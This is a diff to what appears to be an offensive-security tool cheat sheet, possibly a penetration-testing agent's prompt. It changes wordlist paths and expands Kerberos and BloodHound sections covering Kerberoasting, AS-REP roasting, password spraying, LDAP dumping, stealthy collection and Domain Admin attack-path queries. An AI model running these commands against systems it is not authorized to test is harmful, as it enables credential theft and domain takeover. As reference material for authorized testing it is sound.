@@ -44,11 +44,11 @@ AVAILABLE TOOLS & EXACT COMMAND SYNTAX
   sntp -d <ip>                                             # NTP enumeration (domain/time sync)
 
 [WEB]
-  feroxbuster -u http://<ip>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --smart -k
-  feroxbuster -u http://<ip>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt -k
-  ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403
-  ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<domain>" -mc 200,301,302
-  ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  # param fuzz
+  feroxbuster -u http://<ip>/ -w /usr/local/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --smart -k
+  feroxbuster -u http://<ip>/ -w /usr/local/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt -k
+  ffuf -u http://<ip>/FUZZ -w /usr/local/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403
+  ffuf -u http://<ip>/FUZZ -w /usr/local/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<domain>" -mc 200,301,302
+  ffuf -u http://<ip>/FUZZ -w /usr/local/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  # param fuzz
   nikto -h http://<ip>/
   sqlmap -u "http://<ip>/page?id=1" --batch --dbs
   ghauri -u "http://<ip>/page?id=1" --dbs --batch                      # ghauri: faster than sqlmap for some WAFs
@@ -72,25 +72,47 @@ AVAILABLE TOOLS & EXACT COMMAND SYNTAX
   nxc ftp <ip> -u '' -p ''                                # anonymous FTP
   nxc ssh <ip> -u <user> -p <pass> -x "id"               # SSH exec
 
-[KERBEROS / AD]
-  GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <dc>        # AS-REP roast (no creds)
-  GetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -dc-ip <dc>  # AS-REP with creds
-  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request               # Kerberoast
-  GetUserSPNs.py <domain>/<user> -hashes :<nthash> -dc-ip <dc> -request    # Kerberoast PTH
-  kerbrute userenum -d <domain> --dc <dc> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-  kerbrute passwordspray -d <domain> --dc <dc> users.txt <password>
-  ldapdomaindump ldap://<dc> -u '<domain>/<user>' -p <pass> -o /tmp/ldd/   # full LDAP dump
-  ldd2bloodhound /tmp/ldd/                                                   # convert to BH format
+[TIME SYNC — KERBEROS PREREQUISITE]
+  sudo sntp -sS <dc-ip>                                                      # sync clock to DC (ALWAYS do this before any Kerberos op)
+  # If clock skew > 5 min, Kerberos auth fails with KRB_AP_ERR_SKEW
 
-[BLOODHOUND COLLECTION & QUERIES]
-  rusthound-ce -d <domain> -u <user>@<domain> -p <pass> -i <dc-ip> -z  # collect & zip for BH CE
-  rusthound-ce -d <domain> -u <user>@<domain> -H <hash> -i <dc-ip> -z  # PTH collection
-  bhcli data upload -d /tmp/rusthound_output/                           # upload to BH CE
-  bhcli query "MATCH (u:User) RETURN u.name LIMIT 20"                  # raw Cypher
-  bhcli find-path --from <user> --to "Domain Admins"                   # attack paths
-  bhcli find-shortest-path --from <user> --to "Domain Controllers"
-  bhcli find --type user --owned                                        # list owned nodes
-  bhcli mark --node <user> --owned                                      # mark as owned
+[KERBEROS / AD]
+  GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <dc>         # AS-REP roast (no creds)
+  GetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -dc-ip <dc> # AS-REP with creds
+  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request                # Kerberoast
+  GetUserSPNs.py <domain>/<user> -hashes :<nthash> -dc-ip <dc> -request     # Kerberoast PTH
+  kerbrute userenum -d <domain> --dc <dc> /usr/local/share/seclists/Usernames/xato-net-10-million-usernames.txt
+  kerbrute passwordspray -d <domain> --dc <dc> users.txt <password>
+  ldapdomaindump ldap://<dc> -u '<domain>/<user>' -p <pass> -o /tmp/ldd/    # full LDAP dump
+  ldd2bloodhound /tmp/ldd/                                                    # convert to BH format
+
+[BLOODHOUND — COLLECTION (rusthound-ce)]
+  rusthound-ce -d <domain> -u <user>@<domain> -p <pass> -i <dc-ip> -z       # collect all, zip output
+  rusthound-ce -d <domain> -u <user>@<domain> -p <pass> -f <dc-fqdn> -z     # use FQDN instead of IP
+  rusthound-ce -d <domain> -u <user>@<domain> -p <pass> -i <dc-ip> -c DCOnly -z  # LDAP only (no SMB, stealthier)
+  KRB5CCNAME=<ticket.ccache> rusthound-ce -d <domain> -u <user>@<domain> -i <dc-ip> -k -z  # Kerberos auth
+  # Output: ./20240101_rusthound_*.zip — upload this file to BH CE
+
+[BLOODHOUND — UPLOAD & QUERIES (bhcli)]
+  bhcli upload <file.zip>                                                     # upload rusthound zip to BH CE
+  bhcli domains                                                               # list collected domains
+  bhcli users -d <DOMAIN.LOCAL>                                               # list all users in domain
+  bhcli users -d <DOMAIN.LOCAL> --owned                                       # list owned users
+  bhcli users -d <DOMAIN.LOCAL> --sam --description                           # show SAM + descriptions
+  bhcli computers -d <DOMAIN.LOCAL>                                            # list computers
+  bhcli computers -d <DOMAIN.LOCAL> --owned                                    # list owned computers
+  bhcli groups -d <DOMAIN.LOCAL>                                               # list groups
+  bhcli members "Domain Admins@<DOMAIN.LOCAL>"                                 # members of a group (full BH label)
+  bhcli members "Domain Admins@<DOMAIN.LOCAL>" --indirect                      # include nested members
+  bhcli mark Owned <user@domain.local>                                         # mark user as owned
+  bhcli mark Owned <COMPUTER@DOMAIN.LOCAL>                                     # mark computer as owned
+  bhcli mark "Tier Zero" <object@domain.local>                                 # mark as tier zero
+  bhcli audit -d <DOMAIN.LOCAL>                                                # show attack paths / audit findings
+  bhcli cypher "MATCH (u:User {enabled:true}) RETURN u.name LIMIT 20"         # raw Cypher query
+  bhcli cypher "MATCH p=shortestPath((u:User {name:'USER@DOM'})-[*]->(g:Group {name:'DOMAIN ADMINS@DOM'})) RETURN p"  # attack path
+  bhcli cypher "MATCH (u:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@DOM'}) RETURN u.name"  # DA members
+  bhcli cypher "MATCH (u:User {owned:true})-[r]->(n) RETURN u.name, type(r), n.name LIMIT 30"    # owned user outbound edges
+  bhcli stats                                                                  # domain stats / edge counts
 
 [CERTIFICATE ATTACKS (ADCS)]
   certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable    # find vuln templates
@@ -190,12 +212,12 @@ AVAILABLE TOOLS & EXACT COMMAND SYNTAX
   # Check scheduled tasks: schtasks /query /fo LIST /v
 
 [WORDLISTS]
-  /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
-  /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
-  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
-  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+  /usr/local/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+  /usr/local/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+  /usr/local/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+  /usr/local/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+  /usr/local/share/seclists/Usernames/xato-net-10-million-usernames.txt
+  /usr/local/share/seclists/Passwords/Leaked-Databases/rockyou.txt
   /usr/share/wordlists/rockyou.txt
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
